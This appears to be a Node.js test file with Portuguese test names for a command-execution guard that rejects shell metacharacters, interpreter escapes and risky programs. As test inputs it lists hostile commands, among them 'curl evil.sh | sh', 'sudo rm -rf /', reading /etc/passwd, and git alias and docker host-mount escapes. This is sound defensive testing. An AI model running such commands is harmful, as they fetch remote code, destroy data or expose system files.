import test from "node:test";
import assert from "node:assert";
import { toArgv, isSafe, runDeclared, isAllowedProgram } from "../lib/exec.js";

test("recusa sintaxe de shell vinda de arquivo de dado", () => {
  for (const evil of [
    "id > /tmp/pwned; echo PWNED",
    "echo ok && curl evil.sh | sh",
    "echo $(whoami)",
    "cat /etc/passwd | head -1",
    "echo `id`",
  ])
    assert.equal(isSafe(evil), false, evil);
});

test("comando declarado sem metacaractere passa", () => {
  assert.equal(isSafe("git rev-parse HEAD"), true);
  assert.deepEqual(toArgv('grep -c "foo bar" file.txt'), ["grep", "-c", "foo bar", "file.txt"]);
});

test("payload do pentest nao executa", () => {
  const r = runDeclared("id > /tmp/bilro_test_pwned; echo PWNED");
  assert.equal(r.refused, true);
  assert.equal(r.ok, false);
});

test("execucao real acontece sem shell", () => {
  const r = runDeclared("echo hello");
  assert.equal(r.ok, true);
  assert.match(r.output, /hello/);
});

test("interpretador como programa e recusado mesmo sem metacaractere", () => {
  for (const linha of [
    'sh -c "touch /tmp/x"',
    'bash -c "touch /tmp/x"',
    '/bin/sh -c "touch /tmp/x"',
    'python3 -c "open(\'/tmp/x\',\'w\')"',
    'node -e "require(\'fs\').writeFileSync(\'/tmp/x\',\'\')"',
    "env touch /tmp/x",
    "sudo rm -rf /",
  ])
    assert.equal(runDeclared(linha).refused, true, `deveria recusar: ${linha}`);
});

test("verificacao legitima continua permitida", () => {
  for (const linha of ["git rev-parse HEAD", "git log --oneline -1", "cat package.json"])
    assert.equal(isAllowedProgram(linha), true, linha);
});

test("programa que e motor de execucao saiu da lista", () => {
  for (const linha of [
    'git -c "alias.pwn=!touch /tmp/x" pwn',
    "git --exec-path=/tmp log",
    "curl -o /tmp/x file:///etc/hosts",
    "kubectl exec pod -- touch /tmp/x",
    "docker run -v /:/host alpine touch /host/tmp/x",
    "git push origin main",
  ])
    assert.equal(isAllowedProgram(linha), false, `deveria recusar: ${linha}`);
});
